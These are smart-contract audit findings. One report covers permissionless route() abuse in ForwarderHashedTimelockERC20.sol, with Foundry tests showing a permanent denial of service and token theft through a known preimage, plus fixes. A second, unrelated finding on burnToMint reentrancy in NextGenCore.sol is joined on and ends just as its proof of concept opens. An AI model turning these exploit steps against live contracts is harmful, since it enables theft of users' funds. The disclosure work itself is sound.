Vulnerability Report: ForwarderHashedTimelockERC20.sol - route() Function
Context
File:
ForwarderHashedTimelockERC20.sol
Line Number:
L64
Description
The
route()
function of
ForwarderHashedTimelockERC20.sol
enables users to create a route for incoming or outgoing transactions, provided that the preceding transaction is either settled or refunded and the contract remains in its initial state.
Because of the function's permissionless design and absence of input validations, a malicious actor can create routes with infinite timelocks, effectively blocking admins' ability to transfer tokens. They can also steal those tokens by creating malicious routes.
Impact
Permanently Denial of Service (DoS) the
ForwarderHashedTimelockERC20.sol
contract, forcing the project to deploy new forwarders.
Block recovery of service tokens held in the forwarder by admin through the transfer function.
Steal the service tokens in the forwarder by creating a route with a hashlock and a known preimage.
Proof of Concept
Attack Scenario 1: Permanent DoS
An attacker can:
Call
route()
with
_timelock
set to
type(uint256).max
.
Set
_incoming
to
false
to bypass depositing any tokens.
Use any invalid
_hashlock
since settlement won't be needed.
----new code block----
import {Test} from "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ForwarderHashedTimelockERC20} from "contracts/ForwarderHashedTimelockERC20.sol";
​
contract BobERC20 is ERC20 {
 constructor(uint256 _initialBalance) ERC20("Bob Token", "BobToken") {
        _mint(msg.sender, _initialBalance);
    }
}
​
contract ForwarderTest is Test {
 address public owner = address(69_420);
    BobERC20 public erc20;
    ForwarderHashedTimelockERC20 public timelock;
​
 function setUp() external {
        timelock = new ForwarderHashedTimelockERC20(owner);
        erc20 = new BobERC20(1_000_000e18);
        deal(address(erc20), address(timelock), 100e18);
    }
​
 function test_dos() external {
 // asserting admin can transfer the tokens out of timelock
        assertEq(erc20.balanceOf(address(timelock)), 100e18);
        assertEq(timelock.counterparty(), address(0));
​
 // malicious user creating a spam route with an invalid hashlock
        timelock.route(address(420), false, bytes32(0), type(uint256).max, address(0), 100e18);
​
 // will revert that contract is in settlement state but the timelocked period is absurdly large (almost 300 years)
        vm.prank(owner);
        timelock.transfer(address(erc20), owner, 100e18);
    }
}
----end of code block ----
Attack Scenario 2: Token Theft
An attacker can:
Call
route()
with
_hashlock
set to a value generated by using a known
_preimage
.
Use the known
_preimage
to settle and steal service tokens from the time-locked contract.
----new code block----
function test_steal() external {
 // asserting admin can transfer the tokens out of timelock
    assertEq(erc20.balanceOf(address(timelock)), 100e18);
    assertEq(timelock.counterparty(), address(0));
​
 // create a route by using a preimage that's already known
    timelock.route(address(420), false, bytes32(sha256(abi.encodePacked(keccak256("malicious-preimage")))), block.timestamp + 1 seconds, address(erc20), 100e18);
​
 // will steal by creating a route of a malicious preimage
    timelock.settle(keccak256("malicious-preimage"));
    assertEq(erc20.balanceOf(address(timelock)), 0);
    assertEq(erc20.balanceOf(address(420)), 100e18);
}
----end of code block ----
Recommendation
Consider implementing access controls for
route()
creation. However, if the core idea is to leave the function permissionless, consider sweeping all service tokens to a controlled treasury during reset and leave no funds in the contract.
Apart from the recommendations mentioned above, consider implementing checks to ensure the inputs to the function are valid. The input sanitation recommendations include:
Bounding the
_timelock
parameter with an upper bound (e.g.,
block.timestamp + 2 days
).
Ensuring
_hashlock
value is not
bytes32(0)
.
Ensuring
_tokenContract
is not
address(0)
.
Ensuring
_amount
validation is done for incoming and outgoing transactions.
Updates
SatsBridge:
Fixed in commit 05ea0763.
Cantina Managed:
Fixed. Outgoing transaction is made permissioned with the requirement:
----new code block----
require(msg.sender == owner(), "Only owner can set outgoing transfers");
----end of code block ----

The current implementation of the
burnToMint
function in the
NextGenCore.sol
smart contract permits a contract holder to both burn and sell the same NFT, effectively exploiting it to mint a new NFT. This leads to potential fraudulent activities when trading the NFT.
Proof of Concept
The vulnerability stems from the order of operations in the
burnToMint
function. Currently, a new token is minted (
_mintProcessing
) before the existing token is burned (
_burn
). This sequence of operations opens a window for exploitation:
----new code block----
File: smart-contracts/NextGenCore.sol
213:     function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {
214:         require(msg.sender == minterContract, "Caller is not the Minter Contract");
215:         require(_isApprovedOrOwner(burner, _tokenId), "ERC721: caller is not token owner or approved");
216:         collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;
217:         if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {
218:             _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
219:             // burn token
220:             _burn(_tokenId);
221:             burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;
222:         }
223:     }
----end of code block ----
https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L213-L223
The
_mintProcessing
function calls
_safeMint
, which in turn can trigger arbitrary code execution if the recipient is a contract. This allows for manipulation such as transferring the NFT (set to be burned) to another user before the burn occurs:
----new code block----
File: smart-contracts/NextGenCore.sol
227:     function _mintProcessing(uint256 _mintIndex, address _recipient, string memory _tokenData, uint256 _collectionID, uint256 _saltfun_o) internal {
228:         tokenData[_mintIndex] = _tokenData;
229:         collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
230:         tokenIdsToCollectionIds[_mintIndex] = _collectionID;
231:         _safeMint(_recipient, _mintIndex);
232:     }
----end of code block ----
https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L227-L232
A malicious actor can exploit this by listing the NFT for sale. When there is a buy offer, the malicious contract can call
burnToMint
to receive the new NFT and simultaneously accept an offer to buy the original NFT, resulting in the original NFT being burned but still sold, effectively duping the buyer.
In this POC scenario, there are two collections; 1 and 2. The admin is set so that users can burn token in collection 1 to mint token in collection 2.
A malicious contract has the token
10000000000
of collection 1, it lists the token
10000000000
in the marketplace.
addr3
offers to buy the token
10000000000
from the malicious contract.
The malicious contract calls
burnToMint
, stimulously receives token
20000000000
from collection 2 and accepts the offer to buy
10000000000
from
addr3
.
In the end, token
10000000000
is burnt and
addr3
receives nothing. The malicious contract receives both token
20000000000
from
burnToMint
and proceed from the sales of token
10000000000
.
POC:
Save the code in
test/nextGen.test.sol
Setup foundry and Run: forge test
-vvvvv --match-contract NextGenCoreTest --match-test testBurnToMintReentrancy
----new code block----
